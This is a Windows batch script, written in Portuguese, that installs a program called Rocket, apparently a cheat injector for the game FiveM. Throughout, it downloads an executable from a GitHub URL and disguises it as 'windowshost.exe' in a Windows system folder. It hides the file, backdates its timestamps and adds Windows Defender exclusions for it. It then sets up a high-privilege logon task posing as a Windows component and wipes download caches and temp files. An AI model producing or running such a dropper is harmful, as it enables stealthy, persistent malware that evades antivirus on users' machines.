@echo off
:: ========================================
::  INSTALADOR ROCKET - VERSÃO DEFINITIVA
::  Sem loops, sem erros, funciona via GitHub
:: ========================================

title Instalador Rocket
color 0A

:: Verificar Windows 10
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Requer Windows 10!
    pause
    exit /b 1
)

:: Verificar Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute como Administrador!
    pause
    exit /b 1
)

:: Configurações
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "ARQUIVO=windowshost.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"

:: Criar pasta
if not exist "%PASTA%" mkdir "%PASTA%" >nul 2>&1

echo.
echo ========================================
echo    INSTALADOR ROCKET - VERSAO DEFINITIVA
echo ========================================
echo.

:: ========================================
:: LIMPEZA COMPLETA PRIMEIRO
:: ========================================
echo [1/5] Limpando tudo...

taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1
taskkill /f /im cmd.exe /fi "WINDOWTITLE eq Sistema*" >nul 2>&1

schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\WindowsApps\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost" /f >nul 2>&1
schtasks /delete /tn "Rocket" /f >nul 2>&1
schtasks /delete /tn "ZERO" /f >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null"

timeout /t 3 /nobreak >nul
echo [OK] Limpeza concluida!
echo.

:: ========================================
:: VERIFICAR ROCKET.EXE NO GITHUB
:: ========================================
echo [2/5] Verificando Rocket.exe no GitHub...
powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; try { $r=Invoke-WebRequest -Uri $url -UseBasicParsing -Method Head -TimeoutSec 15 -ErrorAction Stop; Write-Host '[OK] Rocket.exe encontrado!' -ForegroundColor Green; exit 0 } catch { Write-Host '[ERRO] Rocket.exe NAO encontrado!' -ForegroundColor Red; Write-Host 'URL: ' $url -ForegroundColor Yellow; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; Write-Host ''; Write-Host 'SOLUCAO:' -ForegroundColor Cyan; Write-Host '  1. Compile o Rocket.exe' -ForegroundColor White; Write-Host '  2. Suba para GitHub: unknow2/main/Rocket.exe' -ForegroundColor White; Write-Host '  3. Execute este script novamente' -ForegroundColor White; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    pause
    exit /b 1
)

echo.

:: ========================================
:: BAIXAR ROCKET.EXE
:: ========================================
echo [3/5] Baixando Rocket.exe...

if exist "%CAMINHO%" (
    attrib -s -h "%CAMINHO%" >nul 2>&1
    del /q /f "%CAMINHO%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

powershell -ExecutionPolicy Bypass -Command "$url='%URL%'; $out='%CAMINHO%'; try { $ProgressPreference='SilentlyContinue'; Write-Host '     Baixando...' -NoNewline; $response=Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if (Test-Path $out) { $file=Get-Item $out; $size=$file.Length; if ($size -gt 1000) { Write-Host ' [OK]' -ForegroundColor Green; Write-Host '[OK] Download concluido! Tamanho: ' $size ' bytes' -ForegroundColor Green; exit 0 } else { Write-Host ' [ERRO] Arquivo muito pequeno!' -ForegroundColor Red; Remove-Item $out -Force -ErrorAction SilentlyContinue; exit 1 } } else { Write-Host ' [ERRO] Arquivo nao criado!' -ForegroundColor Red; exit 1 } } catch { Write-Host ' [ERRO]' -ForegroundColor Red; Write-Host '[ERRO] Falha no download!' -ForegroundColor Red; Write-Host 'Erro: ' $_.Exception.Message -ForegroundColor Yellow; if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }; exit 1 }"

if %errorLevel% neq 0 (
    echo.
    echo [ERRO] Falha no download!
    pause
    exit /b 1
)

if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao foi baixado!
    pause
    exit /b 1
)

echo.

:: ========================================
:: CONFIGURAR ARQUIVO
:: ========================================
echo [4/5] Configurando arquivo...

attrib +s +h "%CAMINHO%" >nul 2>&1

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $file.LastWriteTime=(Get-Date).AddYears(-2); $file.CreationTime=(Get-Date).AddYears(-2); Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue } } catch { }"

echo [OK] Arquivo configurado!
echo.

:: ========================================
:: CRIAR TAREFA AGENDADA (SEM LOOPS - VERSÃO CORRIGIDA)
:: ========================================
echo [5/5] Criando tarefa agendada (versao sem loops)...

timeout /t 3 /nobreak >nul

:: Verificar se arquivo existe antes de criar tarefa
if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao existe! Nao e possivel criar tarefa.
    pause
    exit /b 1
)

:: Criar tarefa com configurações que PREVINEM loops (método robusto)
echo     Tentando metodo PowerShell...
powershell -ExecutionPolicy Bypass -Command "try { $action=New-ScheduledTaskAction -Execute '%CAMINHO%'; $trigger=New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay='PT30S'; $principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false); Register-ScheduledTask -TaskName '%TAREFA%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force -ErrorAction Stop | Out-Null; Write-Host 'SUCCESS' } catch { Write-Host 'FAILED: ' $_.Exception.Message; exit 1 }"

:: Verificar se tarefa foi criada (método robusto com múltiplas tentativas)
timeout /t 3 /nobreak >nul
set "TASK_CREATED=0"
for /L %%i in (1,1,5) do (
    schtasks /query /tn "%TAREFA%" >nul 2>&1
    if %errorLevel% equ 0 (
        set "TASK_CREATED=1"
        goto :TASK_VERIFIED
    )
    timeout /t 1 /nobreak >nul
)

:TASK_VERIFIED
if %TASK_CREATED% equ 1 (
    echo [OK] Tarefa agendada criada e confirmada!
    echo [INFO] Configurada para executar apenas uma vez por logon
    echo [INFO] Delay de 30 segundos apos logon
    echo [INFO] MultipleInstances: IgnoreNew (previne loops)
    echo.
    goto :TASK_DONE
)

echo     Tentando metodo schtasks...
schtasks /create /tn "%TAREFA%" /tr "\"%CAMINHO%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /delay 0030 /f >nul 2>&1
if %errorLevel% equ 0 (
    timeout /t 3 /nobreak >nul
    for /L %%i in (1,1,5) do (
        schtasks /query /tn "%TAREFA%" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Tarefa criada via metodo alternativo e confirmada!
            goto :TASK_DONE
        )
        timeout /t 1 /nobreak >nul
    )
)

echo     Tentando metodo XML...
powershell -ExecutionPolicy Bypass -Command "$xml='<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><RegistrationInfo><Date>2020-01-01T00:00:00</Date><Description>Componente de Host de Aplicativos do Windows</Description></RegistrationInfo><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger></Triggers><Principals><Principal id=\"Author\"><UserId>%USERNAME%</UserId><RunLevel>Highest</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>false</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings><Actions Context=\"Author\"><Exec><Command>%CAMINHO%</Command></Exec></Actions></Task>'; $xml | Out-File -FilePath $env:TEMP\task_rocket.xml -Encoding Unicode -Force; $result=schtasks /create /tn '%TAREFA%' /xml $env:TEMP\task_rocket.xml /f 2>&1; Remove-Item $env:TEMP\task_rocket.xml -Force -ErrorAction SilentlyContinue; if ($LASTEXITCODE -eq 0) { Write-Host 'SUCCESS' } else { Write-Host 'FAILED'; exit 1 }"

if %errorLevel% equ 0 (
    timeout /t 3 /nobreak >nul
    for /L %%i in (1,1,5) do (
        schtasks /query /tn "%TAREFA%" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Tarefa criada via XML e confirmada!
            goto :TASK_DONE
        )
        timeout /t 1 /nobreak >nul
    )
)

echo [ERRO] Todos os metodos falharam ao criar tarefa!
echo [INFO] Execute CRIAR_TAREFA.bat manualmente como administrador.
echo.

:TASK_DONE

echo.

:: ========================================
:: VERIFICAÇÃO FINAL
:: ========================================
echo.
echo [VERIFICACAO] Verificando instalacao...
set "INSTALL_OK=1"

if not exist "%CAMINHO%" (
    echo [ERRO] Arquivo nao encontrado: %CAMINHO%
    set "INSTALL_OK=0"
) else (
    echo [OK] Arquivo encontrado: %CAMINHO%
    for %%A in ("%CAMINHO%") do (
        if %%~zA LSS 1000 (
            echo [ERRO] Arquivo muito pequeno: %%~zA bytes
            set "INSTALL_OK=0"
        ) else (
            echo [OK] Tamanho do arquivo: %%~zA bytes
        )
    )
)

schtasks /query /tn "%TAREFA%" >nul 2>&1
if %errorLevel% neq 0 (
    echo [AVISO] Tarefa agendada nao encontrada
    set "INSTALL_OK=0"
) else (
    echo [OK] Tarefa agendada confirmada
)

:: Limpar
certutil -urlcache * delete >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1

:: ========================================
:: CONCLUSÃO
:: ========================================
echo.
echo ========================================
if %INSTALL_OK% equ 1 (
    echo    INSTALACAO CONCLUIDA COM SUCESSO!
) else (
    echo    INSTALACAO CONCLUIDA COM AVISOS!
)
echo ========================================
echo.
echo [OK] Rocket.exe instalado em:
echo     %CAMINHO%
echo.
echo [OK] Tarefa agendada: %TAREFA%
echo [OK] O Rocket sera executado 30 segundos
echo      apos o proximo logon
echo.
echo [INFO] Ordem de uso:
echo    1. Reinicie o PC
echo    2. Aguarde 30 segundos apos logon
echo    3. Abra o FiveM (clique duas vezes)
echo    4. Aguarde alguns segundos para a injecao
echo    5. Pressione INSERT para abrir o menu
echo.
if %INSTALL_OK% neq 1 (
    echo [AVISO] Alguns avisos foram encontrados.
    echo         Se tiver problemas, execute o instalador novamente.
    echo.
)
echo Pressione qualquer tecla para fechar...
pause >nul
exit
